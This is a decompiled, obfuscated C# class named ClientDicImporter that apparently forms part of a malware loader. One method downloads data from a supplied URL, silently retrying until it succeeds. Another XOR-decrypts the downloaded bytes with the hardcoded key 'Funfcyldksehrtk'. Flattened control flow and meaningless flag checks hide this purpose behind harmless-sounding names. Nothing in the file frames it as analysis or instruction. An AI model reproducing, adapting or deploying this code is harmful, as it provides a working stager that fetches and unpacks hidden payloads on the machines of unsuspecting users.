using System;
using System.Net;
using System.Text;

internal sealed class ClientDicImporter
{
	internal static ClientDicImporter InstantiateMapping;

	public ClientDicImporter()
	{
		if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_3b56ff686f404a89a8200ee5e880618a == 0)
		{
			switch (0)
			{
			}
		}
	}

	internal byte[] SelectEvent(string config)
	{
		while (true)
		{
			byte[] array = null;
			int num = 3;
			if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_0739e31796534965bf8a87fe412329f5 == 0)
			{
				continue;
			}
			while (true)
			{
				switch (num)
				{
				default:
					num = 2;
					if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_1d151151ca864e289382f40ec295a7cb == 0)
					{
						continue;
					}
					goto case 2;
				case 2:
					try
					{
						WebClient webClient = new WebClient();
						try
						{
							array = webClient.DownloadData(config);
							if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_62dda1f55544439ea54603913155960b != 0)
							{
								return 0 switch
								{
									_ => array, 
								};
							}
							return array;
						}
						finally
						{
							((IDisposable)webClient).Dispose();
						}
					}
					catch
					{
					}
					goto default;
				case 1:
					break;
				}
				break;
			}
		}
	}

	internal byte[] PatchEvent(byte[] first)
	{
		string object_ = "Funfcyldksehrtk";
		int num = 1;
		if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_8fd8e34f99864e468efa0da68fee2df6 != 0)
		{
			goto IL_0076;
		}
		goto IL_0086;
		IL_0086:
		switch (num)
		{
		case 6:
		case 9:
			break;
		case 4:
			goto IL_0030;
		default:
			goto IL_004c;
		case 5:
		case 8:
			goto IL_0055;
		case 3:
			goto IL_005f;
		case 1:
			goto IL_0076;
		case 2:
			goto IL_00b5;
		}
		goto IL_001b;
		IL_0076:
		byte[] array = (byte[])DestroyMapping(Encoding.ASCII, object_);
		goto IL_0055;
		IL_0055:
		byte[] array2 = new byte[first.Length];
		goto IL_005f;
		IL_005f:
		int num2 = 0;
		num = 0;
		if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_88f081aa4b084fb2aae0c408e431b7b8 == 0)
		{
			goto IL_004c;
		}
		goto IL_0086;
		IL_004c:
		if (num2 < first.Length)
		{
			num = 3;
			if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_d15f8be1023540cc8d3dc120caade88f == 0)
			{
				goto IL_001b;
			}
			goto IL_0086;
		}
		goto IL_00b5;
		IL_00b5:
		return array2;
		IL_001b:
		array2[num2] = (byte)(array[num2 % array.Length] ^ first[num2]);
		goto IL_0030;
		IL_0030:
		num2++;
		goto IL_004c;
	}

	internal static bool FillMapping()
	{
		return InstantiateMapping == null;
	}

	internal static ClientDicImporter ResetMapping()
	{
		return InstantiateMapping;
	}

	internal static object DestroyMapping(object object_0, object object_1)
	{
		return ((Encoding)object_0).GetBytes((string)object_1);
	}
}
